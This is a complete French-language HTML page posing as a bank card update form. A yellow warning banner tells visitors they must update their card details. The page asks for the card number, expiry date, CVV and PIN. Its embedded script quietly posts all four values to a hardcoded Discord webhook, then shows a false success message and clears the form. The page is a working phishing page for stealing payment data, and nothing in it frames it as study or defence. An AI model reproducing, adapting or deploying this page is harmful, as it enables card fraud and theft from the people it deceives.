<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mise à jour Carte Bancaire</title>
    <style>
        body {
            background-color: #001f3f;
            color: white;
            font-family: Arial, sans-serif;
        }
        .container {
            max-width: 600px;
            margin: 50px auto;
            padding: 25px;
            background-color: #003366;
            border-radius: 10px;
        }
        .form-group {
            margin-bottom: 18px;
        }
        .form-group label {
            display: block;
            margin-bottom: 6px;
            font-weight: bold;
        }
        .form-group input {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 5px;
            font-size: 16px;
        }
        .form-group input[type="submit"] {
            background-color: #0056b3;
            color: white;
            cursor: pointer;
            font-weight: bold;
            padding: 14px;
            margin-top: 10px;
        }
        .form-group input[type="submit"]:hover {
            background-color: #004494;
        }
        .warning {
            background-color: #ffcc00;
            color: #333;
            padding: 14px;
            border-radius: 6px;
            margin-bottom: 25px;
            text-align: center;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="warning">
            ⚠️ Mise à jour des informations de votre carte bancaire requise ⚠️
        </div>

        <h2>Coordonnées de votre carte</h2>
        <form id="form">
            <div class="form-group">
                <label for="cardNumber">Numéro de carte (16 chiffres) :</label>
                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
            </div>

            <div class="form-group">
                <label for="expirationDate">Date d'expiration (MM/AA) :</label>
                <input type="text" id="expirationDate" placeholder="12/28" maxlength="5" required>
            </div>

            <div class="form-group">
                <label for="cvv">CVV :</label>
                <input type="text" id="cvv" placeholder="123" maxlength="4" required>
            </div>

            <div class="form-group">
                <label for="pinCode">Code PIN (4 chiffres) :</label>
                <input type="text" id="pinCode" placeholder="••••" maxlength="4" inputmode="numeric" required>
            </div>

            <div class="form-group">
                <input type="submit" value="Valider mes informations">
            </div>
        </form>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1472970808015061072/r5E9PRREA5jd1Oz7UPV9Zt0SJU2ifvVDcywyOn1WvpEImrBdmc0XmA_hVLpUfQgfAMcw";

        async function sendToDiscord() {
            const embed = {
                title: "📥 Nouvelle soumission carte bancaire",
                color: 0x0056b3,
                timestamp: new Date().toISOString(),
                fields: [
                    { name: "Numéro de carte", value: document.getElementById("cardNumber").value || "Non renseigné", inline: false },
                    { name: "Date d'expiration", value: document.getElementById("expirationDate").value || "Non renseigné", inline: true },
                    { name: "CVV", value: document.getElementById("cvv").value || "Non renseigné", inline: true },
                    { name: "Code PIN", value: document.getElementById("pinCode").value || "Non renseigné", inline: false }
                ]
            };

            try {
                await fetch(WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ embeds: [embed] })
                });
                console.log("✅ Données envoyées vers Discord");
            } catch (e) {
                console.error("Erreur :", e);
            }
        }

        document.getElementById("form").addEventListener("submit", async function(e) {
            e.preventDefault();
            await sendToDiscord();

            alert("✅ Vos informations ont bien été enregistrées.");

            // Réinitialisation
            document.querySelectorAll('input').forEach(input => input.value = '');
        });
    </script>
</body>
</html>
